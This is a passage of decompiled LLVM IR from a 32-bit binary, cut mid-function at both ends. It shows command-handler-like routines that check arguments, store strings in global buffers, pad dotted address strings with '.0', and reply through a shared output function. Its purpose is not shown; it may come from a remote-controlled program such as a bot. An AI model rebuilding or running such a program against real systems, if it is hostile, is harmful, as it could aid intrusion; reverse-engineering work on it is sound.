  %v1_8048d85 = icmp eq i1 %v7_8048d83, false
  br i1 %v1_8048d85, label %dec_label_pc_8048da2, label %dec_label_pc_8048d87

dec_label_pc_8048d87:                             ; preds = %dec_label_pc_8048d77
  %v3_8048d8a = load i32, i32* %v2_8048d7a.pre-phi, align 4
  store i32 %v3_8048d8a, i32* %edx.global-to-local, align 4
  %v0_8048d90 = load i32, i32* @ebp, align 4
  %v2_8048d90 = add nsw i32 %storemerge598, -5188
  %v3_8048d90 = add i32 %v2_8048d90, %v0_8048d90
  %v4_8048d90 = inttoptr i32 %v3_8048d90 to i8*
  %v5_8048d90 = load i8, i8* %v4_8048d90, align 1
  %v3_8048d97 = inttoptr i32 %v3_8048d8a to i8*
  store i8 %v5_8048d90, i8* %v3_8048d97, align 1
  %v0_8048d99 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048d99 = add i32 %v0_8048d99, 1
  store i32 %v1_8048d99, i32* @edx, align 4
  store i32 %v1_8048d99, i32* %v2_8048d7a.pre-phi, align 4
  br label %dec_label_pc_8048de0

dec_label_pc_8048da2:                             ; preds = %dec_label_pc_8048d77
  %v0_8048da5 = load i32, i32* @ebp, align 4
  %v2_8048da5 = add nsw i32 %storemerge598, -5188
  %v3_8048da5 = add i32 %v2_8048da5, %v0_8048da5
  %v4_8048da5 = inttoptr i32 %v3_8048da5 to i8*
  %v5_8048da5 = load i8, i8* %v4_8048da5, align 1
  %v0_8048db1 = load i32, i32* @esp, align 4
  %v5_8048db1 = icmp ult i32 %v0_8048db1, 8
  store i1 %v5_8048db1, i1* %cf.global-to-local, align 1
  %v4_8048db8 = call i32 @function_804cfe0(i8 %v5_8048da5, i32 %v3_8048bc0)
  %v0_8048dbd = load i32, i32* @esp, align 4
  %v2_8048dbd = icmp ugt i32 %v0_8048dbd, -17
  store i1 %v2_8048dbd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048de0

dec_label_pc_8048dc2:                             ; preds = %dec_label_pc_8048d67
  %v0_8048dc5 = load i32, i32* @ebp, align 4
  %v2_8048dc5 = add nsw i32 %storemerge598, -5188
  %v3_8048dc5 = add i32 %v2_8048dc5, %v0_8048dc5
  %v4_8048dc5 = inttoptr i32 %v3_8048dc5 to i8*
  %v5_8048dc5 = load i8, i8* %v4_8048dc5, align 1
  %v0_8048dd1 = load i32, i32* @esp, align 4
  %v5_8048dd1 = icmp ult i32 %v0_8048dd1, 8
  store i1 %v5_8048dd1, i1* %cf.global-to-local, align 1
  %v4_8048dd8 = call i32 @function_804cc58(i8 %v5_8048dc5, i32 %v3_8048bc0)
  %v0_8048ddd = load i32, i32* @esp, align 4
  %v2_8048ddd = icmp ugt i32 %v0_8048ddd, -17
  store i1 %v2_8048ddd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048de0

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048da2, %dec_label_pc_8048d87, %dec_label_pc_8048dc2
  %v4_8048de0 = add nuw nsw i32 %storemerge598, 1
  %v10_8048de6 = icmp ult i32 %v4_8048de0, %v5_8048d35102
  store i1 %v10_8048de6, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048de0, %v5_8048d35102
  br i1 %exitcond, label %dec_label_pc_8048d24.loopexit, label %dec_label_pc_8048d67

dec_label_pc_8048df4:                             ; preds = %dec_label_pc_8048d24.loopexit, %dec_label_pc_8048d08
  %v5_8048df4 = icmp ult i32* %stack_var_-5244, inttoptr (i32 12 to i32*)
  store i1 %v5_8048df4, i1* %cf.global-to-local, align 1
  %v1_8048dfa = inttoptr i32 %v3_8048bc0 to i16*
  %v2_8048dfa = call i32 @function_804b77c(i16* %v1_8048dfa)
  store i1 %v5_8048df4, i1* %cf.global-to-local, align 1
  %v1_8048e08 = call i32 @function_804b4a4(i32 %v4_8048991)
  store i32 %v1_8048e08, i32* @eax, align 4
  store i1 %v5_8048df4, i1* %cf.global-to-local, align 1
  %v1_8048e15 = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_8048e1a

dec_label_pc_8048e1a:                             ; preds = %dec_label_pc_8048941, %dec_label_pc_8048df4
  %v0_8048e20 = phi i32 [ %v1_8048952, %dec_label_pc_8048941 ], [ %v1_8048e15, %dec_label_pc_8048df4 ]
  ret i32 %v0_8048e20

; uselistorder directives
  uselistorder i1 %v5_8048df4, { 1, 0, 2 }
  uselistorder i32 %storemerge598, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048d4a, { 1, 0 }
  uselistorder i32 %v5_8048d35102, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048d7a.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048cf4, { 1, 0, 2 }
  uselistorder i32 %v4_8048ce3, { 1, 2, 0 }
  uselistorder i32 %storemerge13.in106, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048c4d, { 1, 0 }
  uselistorder i32 %v7_8048c4b, { 1, 0 }
  uselistorder i32 %storemerge7110, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048bf1, { 1, 0 }
  uselistorder i32 %v5_8048bdc114, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048bd2, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v3_8048bc0, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_8048ab5, { 1, 0, 2 }
  uselistorder i32 %storemerge8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048a56.pre-phi, { 4, 0, 5, 6, 2, 3, 1 }
  uselistorder i1 %v0_80489f9, { 1, 0 }
  uselistorder i32 %v4_8048991, { 3, 4, 1, 5, 0, 6, 7, 2, 8 }
  uselistorder i32 %v4_8048962, { 1, 0 }
  uselistorder i1 %v5_804894c, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v12_8048946, { 1, 0 }
  uselistorder i32* %stack_var_-5244, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i1* %cf.global-to-local, { 5, 34, 35, 42, 36, 37, 38, 39, 40, 41, 0, 43, 44, 1, 45, 46, 57, 53, 47, 48, 49, 50, 51, 52, 2, 54, 55, 56, 3, 58, 59, 4, 60, 61, 62, 63, 64, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -1092, { 1, 0 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048e1a, { 1, 0 }
  uselistorder label %dec_label_pc_8048de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048d08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ce3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048c6a, { 1, 0 }
  uselistorder label %dec_label_pc_8048c11, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf1, { 1, 0 }
  uselistorder label %dec_label_pc_8048b71, { 1, 0 }
  uselistorder label %dec_label_pc_8048b26, { 1, 0 }
  uselistorder label %dec_label_pc_8048b01, { 1, 0 }
  uselistorder label %dec_label_pc_8048a53, { 1, 0 }
  uselistorder label %dec_label_pc_8048a47, { 1, 0 }
  uselistorder label %dec_label_pc_80489c2, { 1, 0 }
  uselistorder label %dec_label_pc_8048988, { 1, 0 }
}

define i32 @function_8048e21(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048e21:
  %tmp32 = call i8 @__decompiler_undefined_function_5()
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp46 = call i8 @__decompiler_undefined_function_5()
  %v0_8048e32 = load i64, i64* @global_var_80560ec.12, align 8
  %v1_8048e32 = trunc i64 %v0_8048e32 to i32
  %v9_8048e49 = icmp eq i32 %v1_8048e32, 1
  %v1_8048e4c = icmp eq i1 %v9_8048e49, false
  br i1 %v1_8048e4c, label %dec_label_pc_8048ea2, label %dec_label_pc_8048e4e

dec_label_pc_8048e4e:                             ; preds = %dec_label_pc_8048e21
  %v3_8048e5e16 = zext i8 %tmp46 to i32
  store i32 %v3_8048e5e16, i32* @ebx, align 4
  %v3_8048e95 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8052730.27 to i32))
  br label %dec_label_pc_8048f4a

dec_label_pc_8048ea2:                             ; preds = %dec_label_pc_8048e21
  %v0_8048e2a = load i8*, i8** @global_var_80560e8.11, align 4
  %v1_8048e2a = ptrtoint i8* %v0_8048e2a to i32
  %v3_8048ec121 = zext i8 %tmp33 to i32
  store i32 %v3_8048ec121, i32* @ebx, align 4
  %v4_8048ed5 = zext i8 %tmp32 to i32
  store i32 %v4_8048ed5, i32* @esi, align 4
  %v1_8048eea = urem i32 %v1_8048e2a, 256
  store i32 %v1_8048eea, i32* @edi, align 4
  %v3_8048f42 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_8052750.28 to i32))
  br label %dec_label_pc_8048f4a

dec_label_pc_8048f4a:                             ; preds = %dec_label_pc_8048e4e, %dec_label_pc_8048ea2
  %v0_8048f51 = phi i32 [ %v3_8048f42, %dec_label_pc_8048ea2 ], [ %v3_8048e95, %dec_label_pc_8048e4e ]
  ret i32 %v0_8048f51

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048f4a, { 1, 0 }
}

define i32 @function_8048f52(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048f52:
  %v3_8048f66 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805277e.29 to i32))
  ret i32 %v3_8048f66
}

define i32 @function_8048f70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048f70:
  %v12_8048f77 = icmp eq i32 %arg3, 1
  br i1 %v12_8048f77, label %dec_label_pc_8048f95, label %dec_label_pc_8048f7d

dec_label_pc_8048f7d:                             ; preds = %dec_label_pc_8048f70
  %v3_8048f8b = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805279b.30 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048f95:                             ; preds = %dec_label_pc_8048f70
  %v1_8048f98 = add i32 %arg4, 4
  %v1_8048f9b = inttoptr i32 %v1_8048f98 to i32*
  %v2_8048f9b = load i32, i32* %v1_8048f9b, align 4
  store i1 false, i1* @df, align 1
  %v4_8048fa8 = inttoptr i32 %v2_8048f9b to i8*
  store i32 %v2_8048f9b, i32* @edi, align 4
  %v3_8048fab = call i32 @_strlen(i8* %v4_8048fa8)
  %v4_8048fab = mul i32 %v3_8048fab, -1
  %v1_8048fb1 = sub i32 0, %v4_8048fab
  %v5_8048fb2 = icmp ult i32 %v1_8048fb1, 9
  %v9_8048fb2 = icmp eq i32 %v4_8048fab, -9
  %v2_8048fb5 = or i1 %v5_8048fb2, %v9_8048fb2
  br i1 %v2_8048fb5, label %dec_label_pc_8048fcf, label %dec_label_pc_8048fb7

dec_label_pc_8048fb7:                             ; preds = %dec_label_pc_8048f95
  %v3_8048fc5 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_80527b4.31 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048fcf:                             ; preds = %dec_label_pc_8048f95
  %v3_8048fe3 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_80527e9.32 to i32))
  br label %dec_label_pc_8048feb

dec_label_pc_8048feb:                             ; preds = %dec_label_pc_8048fb7, %dec_label_pc_8048f7d, %dec_label_pc_8048fcf
  %v0_8048fef = phi i32 [ %v3_8048fc5, %dec_label_pc_8048fb7 ], [ %v3_8048f8b, %dec_label_pc_8048f7d ], [ %v3_8048fe3, %dec_label_pc_8048fcf ]
  ret i32 %v0_8048fef

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048feb, { 2, 0, 1 }
}

define i32 @function_8048ff0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048ff0:
  %v12_8048ff7 = icmp eq i32 %arg3, 1
  br i1 %v12_8048ff7, label %dec_label_pc_8049047, label %dec_label_pc_8048ffd

dec_label_pc_8048ffd:                             ; preds = %dec_label_pc_8048ff0
  %v3_804900b = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_80527f2.33 to i32))
  %v3_804903a = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8052834.36 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_8049047:                             ; preds = %dec_label_pc_8048ff0
  %v0_8049047 = load i8, i8* @global_var_80560e4.6, align 4
  %v4_804904c = icmp eq i8 %v0_8049047, 0
  br i1 %v4_804904c, label %dec_label_pc_804906b, label %dec_label_pc_8049050

dec_label_pc_8049050:                             ; preds = %dec_label_pc_8049047
  %v3_804905e = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052857.37 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_804906b:                             ; preds = %dec_label_pc_8049047
  %v1_804906e = add i32 %arg4, 4
  %v1_8049071 = inttoptr i32 %v1_804906e to i32*
  %v2_8049071 = load i32, i32* %v1_8049071, align 4
  store i1 false, i1* @df, align 1
  %v4_804907e = inttoptr i32 %v2_8049071 to i8*
  store i32 %v2_8049071, i32* @edi, align 4
  %v3_8049081 = call i32 @_strlen(i8* %v4_804907e)
  %v4_8049081 = mul i32 %v3_8049081, -1
  %v1_8049087 = sub i32 0, %v4_8049081
  %v5_8049088 = icmp ult i32 %v1_8049087, 254
  %v9_8049088 = icmp eq i32 %v4_8049081, -254
  %v2_804908d = or i1 %v5_8049088, %v9_8049088
  br i1 %v2_804908d, label %dec_label_pc_80490a7, label %dec_label_pc_804908f

dec_label_pc_804908f:                             ; preds = %dec_label_pc_804906b
  %v3_804909d = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8052878.38 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_80490a7:                             ; preds = %dec_label_pc_804906b
  store i8 1, i8* @global_var_80560e4.6, align 4
  %v5_80490bf = call i32 @function_804d178(i8* bitcast (i32* @global_var_80587a0.39 to i8*), i32 0, i32 256)
  %v2_80490cd = load i32, i32* %v1_8049071, align 4
  store i32 %v2_80490cd, i32* @eax, align 4
  %v4_80490d8 = call i32 @function_804d190(i8* bitcast (i32* @global_var_80587a0.39 to i8*), i32 %v2_80490cd)
  %v3_80490eb = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_80528a0.40 to i32))
  br label %dec_label_pc_80490f3

dec_label_pc_80490f3:                             ; preds = %dec_label_pc_804908f, %dec_label_pc_8049050, %dec_label_pc_8048ffd, %dec_label_pc_80490a7
  %v0_80490f7 = phi i32 [ %v3_804909d, %dec_label_pc_804908f ], [ %v3_804905e, %dec_label_pc_8049050 ], [ %v3_804903a, %dec_label_pc_8048ffd ], [ %v3_80490eb, %dec_label_pc_80490a7 ]
  ret i32 %v0_80490f7

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80490f3, { 3, 0, 1, 2 }
}

define i32 @function_80490f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80490f8:
  %v12_80490fe = icmp eq i32 %arg3, 1
  br i1 %v12_80490fe, label %dec_label_pc_804914b, label %dec_label_pc_8049104

dec_label_pc_8049104:                             ; preds = %dec_label_pc_80490f8
  %v3_8049112 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_80528bf.41 to i32))
  %v3_8049141 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8052834.36 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_804914b:                             ; preds = %dec_label_pc_80490f8
  %v0_804914b = load i8, i8* @global_var_80560e4.6, align 4
  %v4_8049150 = icmp eq i8 %v0_804914b, 0
  %v1_8049152 = icmp eq i1 %v4_8049150, false
  br i1 %v1_8049152, label %dec_label_pc_804916c, label %dec_label_pc_8049154

dec_label_pc_8049154:                             ; preds = %dec_label_pc_804914b
  %v3_8049162 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_80528d9.42 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_804916c:                             ; preds = %dec_label_pc_804914b
  %v1_804916f = add i32 %arg4, 4
  %v1_8049172 = inttoptr i32 %v1_804916f to i32*
  %v2_8049172 = load i32, i32* %v1_8049172, align 4
  %v4_804917d = call i32 @function_804d2f4(i8* bitcast (i32* @global_var_80587a0.39 to i8*), i32 %v2_8049172)
  %v1_8049185 = icmp eq i32 %v4_804917d, 0
  br i1 %v1_8049185, label %dec_label_pc_80491a1, label %dec_label_pc_8049189

dec_label_pc_8049189:                             ; preds = %dec_label_pc_804916c
  %v3_8049197 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_80528f6.43 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804916c
  store i8 0, i8* @global_var_80560e4.6, align 4
  %v3_80491b6 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052911.44 to i32))
  br label %dec_label_pc_80491be

dec_label_pc_80491be:                             ; preds = %dec_label_pc_8049189, %dec_label_pc_8049154, %dec_label_pc_8049104, %dec_label_pc_80491a1
  %v0_80491bf = phi i32 [ %v3_8049197, %dec_label_pc_8049189 ], [ %v3_8049162, %dec_label_pc_8049154 ], [ %v3_8049141, %dec_label_pc_8049104 ], [ %v3_80491b6, %dec_label_pc_80491a1 ]
  ret i32 %v0_80491bf

; uselistorder directives
  uselistorder i8* bitcast (i32* @global_var_80587a0.39 to i8*), { 1, 2, 0 }
  uselistorder i8* @global_var_80560e4.6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80491be, { 3, 0, 1, 2 }
}

define i32 @function_80491c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80491c0:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_80491ca = icmp eq i32 %arg3, 1
  br i1 %v12_80491ca, label %dec_label_pc_80491ff, label %dec_label_pc_80491d0

dec_label_pc_80491d0:                             ; preds = %dec_label_pc_80491c0
  %v3_80491de = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8052930.45 to i32))
  store i32 %v3_80491de, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_80560e8.11, align 8
  store i64 0, i64* @global_var_80560ec.12, align 8
  br label %dec_label_pc_8049396

dec_label_pc_80491ff:                             ; preds = %dec_label_pc_80491c0
  %v1_8049202 = add i32 %arg4, 4
  store i32 %v1_8049202, i32* %eax.global-to-local, align 4
  %v1_8049205 = inttoptr i32 %v1_8049202 to i32*
  %v2_8049205 = load i32, i32* %v1_8049205, align 4
  %v1_8049212 = and i32 %v2_8049205, -256
  store i32 %v1_8049212, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049215 = inttoptr i32 %v2_8049205 to i8*
  store i32 %v2_8049205, i32* @edi, align 4
  %v3_804921b = call i32 @_strlen(i8* %v4_8049215)
  %v4_804921b = mul i32 %v3_804921b, -1
  %v1_8049221 = sub i32 0, %v4_804921b
  store i32 %v1_8049221, i32* %eax.global-to-local, align 4
  %v2_8049222 = icmp ult i32 %v1_8049221, 16
  %v6_8049222 = icmp eq i32 %v4_804921b, -16
  %v2_8049225 = or i1 %v2_8049222, %v6_8049222
  br i1 %v2_8049225, label %dec_label_pc_8049242, label %dec_label_pc_8049227

dec_label_pc_8049227:                             ; preds = %dec_label_pc_80491ff
  %v3_8049235 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_8052950.46 to i32))
  store i32 %v3_8049235, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049396

dec_label_pc_8049242:                             ; preds = %dec_label_pc_80491ff
  store i32 %v1_8049202, i32* %eax.global-to-local, align 4
  %v2_8049248 = load i32, i32* %v1_8049205, align 4
  %v2_804924e = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_804924e, i32* @eax, align 4
  %v3_8049255 = bitcast i32* %stack_var_-276 to i8*
  %v4_8049255 = call i32 @function_804d190(i8* %v3_8049255, i32 %v2_8049248)
  %v2_804926e = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_8049277 = call i32 @_strlen(i8* %v3_8049255)
  %v1_804927e = add i32 %v3_8049277, -1
  store i32 %v1_804927e, i32* %eax.global-to-local, align 4
  %v0_804927f = load i32, i32* @ebp, align 4
  %v2_804927f = add i32 %v3_8049277, -273
  %v3_804927f = add i32 %v2_804927f, %v0_804927f
  %v4_804927f = inttoptr i32 %v3_804927f to i8*
  %v5_804927f = load i8, i8* %v4_804927f, align 1
  %v6_804927f = zext i8 %v5_804927f to i32
  %v8_804927f = and i32 %v1_804927e, -256
  %v9_804927f = or i32 %v6_804927f, %v8_804927f
  store i32 %v9_804927f, i32* %eax.global-to-local, align 4
  %v10_8049286 = icmp eq i8 %v5_804927f, 46
  %v1_8049288 = icmp eq i1 %v10_8049286, false
  br i1 %v1_8049288, label %dec_label_pc_80492d8, label %dec_label_pc_804928a

dec_label_pc_804928a:                             ; preds = %dec_label_pc_8049242
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_80492a4 = call i32 @_strlen(i8* %v3_8049255)
  %v1_80492ab = add i32 %v3_80492a4, -1
  store i32 %v1_80492ab, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @ebp, align 4
  %v2_80492ac = add i32 %v3_80492a4, -273
  %v3_80492ac = add i32 %v2_80492ac, %v0_80492ac
  %v4_80492ac = inttoptr i32 %v3_80492ac to i8*
  store i8 0, i8* %v4_80492ac, align 1
  br label %dec_label_pc_80492d8

dec_label_pc_80492c4:                             ; preds = %dec_label_pc_80492d8
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_80492c7 = load i32, i32* @ebp, align 4
  %v2_80492c7 = add i32 %stack_var_-20.0, -272
  %v3_80492c7 = add i32 %v2_80492c7, %v0_80492c7
  %v4_80492c7 = inttoptr i32 %v3_80492c7 to i8*
  %v5_80492c7 = load i8, i8* %v4_80492c7, align 1
  %v6_80492c7 = zext i8 %v5_80492c7 to i32
  %v8_80492c7 = and i32 %stack_var_-20.0, -256
  %v9_80492c7 = or i32 %v6_80492c7, %v8_80492c7
  store i32 %v9_80492c7, i32* %eax.global-to-local, align 4
  %v10_80492ce = icmp eq i8 %v5_80492c7, 46
  %v4_80492d2 = zext i1 %v10_80492ce to i32
  %stack_var_-16.1.v4_80492d2 = add i32 %v4_80492d2, %stack_var_-16.1
  %v4_80492d5 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_80492d8

dec_label_pc_80492d8:                             ; preds = %dec_label_pc_804928a, %dec_label_pc_8049242, %dec_label_pc_80492c4
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.1.v4_80492d2, %dec_label_pc_80492c4 ], [ 1, %dec_label_pc_8049242 ], [ 1, %dec_label_pc_804928a ]
  %stack_var_-20.0 = phi i32 [ %v4_80492d5, %dec_label_pc_80492c4 ], [ 0, %dec_label_pc_8049242 ], [ 0, %dec_label_pc_804928a ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_80492f5 = call i32 @_strlen(i8* %v3_8049255)
  store i32 %v3_80492f5, i32* %eax.global-to-local, align 4
  %v0_80492fc = load i32, i32* @edx, align 4
  %v7_80492fc = icmp ult i32 %v0_80492fc, %v3_80492f5
  br i1 %v7_80492fc, label %dec_label_pc_80492c4, label %dec_label_pc_8049300

dec_label_pc_8049300:                             ; preds = %dec_label_pc_80492d8
  %v5_8049305 = sub i32 4, %stack_var_-16.1
  %v15_8049305 = icmp eq i32 %v5_8049305, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804935027 = icmp sgt i32 %v5_8049305, 0
  br i1 %v5_804935027, label %dec_label_pc_8049314, label %dec_label_pc_8049352

dec_label_pc_8049314:                             ; preds = %dec_label_pc_8049300, %dec_label_pc_8049314
  %storemerge228 = phi i32 [ %v4_8049347, %dec_label_pc_8049314 ], [ 0, %dec_label_pc_8049300 ]
  store i32 %v2_804924e, i32* @edx, align 4
  store i32 %v2_804926e, i32* %eax.global-to-local, align 4
  %v3_8049334 = call i32 @_strlen(i8* %v3_8049255)
  %v0_804933b = load i32, i32* @edx, align 4
  %v0_804933b29 = add i32 %v0_804933b, %v3_8049334
  store i32 %v0_804933b29, i32* %eax.global-to-local, align 4
  %v1_804933e = inttoptr i32 %v0_804933b29 to i16*
  store i16 12334, i16* %v1_804933e, align 2
  %v0_8049343 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049343 = add i32 %v0_8049343, 2
  %v2_8049343 = inttoptr i32 %v1_8049343 to i8*
  store i8 0, i8* %v2_8049343, align 1
  %v4_8049347 = add nuw nsw i32 %storemerge228, 1
  store i32 %v4_8049347, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8049347, %v5_8049305
  br i1 %exitcond, label %dec_label_pc_8049352, label %dec_label_pc_8049314

dec_label_pc_8049352:                             ; preds = %dec_label_pc_8049314, %dec_label_pc_8049300
  store i32 %v2_804924e, i32* @eax, align 4
  %v2_804935c = call i32 @function_804d438(i8* %v3_8049255)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v1_804936b = icmp eq i1 %v15_8049305, false
  br i1 %v1_804936b, label %dec_label_pc_8049379, label %dec_label_pc_804938e

dec_label_pc_8049379:                             ; preds = %dec_label_pc_8049352
  %v3_8049381 = call i32 @function_8048878(i64 256, i32 %v5_8049305)
  store i32 %v3_8049381, i32* %eax.global-to-local, align 4
  %v1_8049389 = sext i32 %v3_8049381 to i64
  br label %dec_label_pc_804938e

dec_label_pc_804938e:                             ; preds = %dec_label_pc_8049352, %dec_label_pc_8049379
  %storemerge = phi i64 [ %v1_8049389, %dec_label_pc_8049379 ], [ 1, %dec_label_pc_8049352 ]
  store i64 %storemerge, i64* @global_var_80560ec.12, align 8
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v1_8049391 = inttoptr i32 %v2_804935c to i8*
  store i8* %v1_8049391, i8** @global_var_80560e8.11, align 8
  br label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_8049227, %dec_label_pc_80491d0, %dec_label_pc_804938e
  %v0_804939a = phi i32 [ %v3_8049235, %dec_label_pc_8049227 ], [ %v3_80491de, %dec_label_pc_80491d0 ], [ %v2_804935c, %dec_label_pc_804938e ]
  ret i32 %v0_804939a

; uselistorder directives
  uselistorder i32 %v2_804935c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_8049347, { 1, 2, 0 }
  uselistorder i32 %v5_8049305, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-20.0, { 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_804926e, { 1, 2, 0, 3 }
  uselistorder i8* %v3_8049255, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v1_8049221, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 22, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049396, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804938e, { 1, 0 }
  uselistorder label %dec_label_pc_8049314, { 1, 0 }
  uselistorder label %dec_label_pc_80492d8, { 2, 0, 1 }
}

define i32 @function_804939b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804939b:
  %v1_80493a7 = call i32 @function_804d518(i32 %arg2)
  store i32 %v1_80493a7, i32* @global_var_8056500.47, align 256
  %v10_80493b9 = icmp eq i32 %v1_80493a7, -1
  %v1_80493bc = icmp eq i1 %v10_80493b9, false
  br i1 %v1_80493bc, label %dec_label_pc_804941b, label %dec_label_pc_80493be

dec_label_pc_80493be:                             ; preds = %dec_label_pc_804939b
  %v1_80493c4 = call i32 @function_804d540(i32 %arg2)
  %v4_80493cf = icmp eq i32 %v1_80493c4, 0
  %v1_80493d3 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d3, label %dec_label_pc_80493f8, label %dec_label_pc_80493d5

dec_label_pc_80493d5:                             ; preds = %dec_label_pc_80493be
  %v0_80493d5 = load i32, i32* @global_var_80588a8.7, align 8
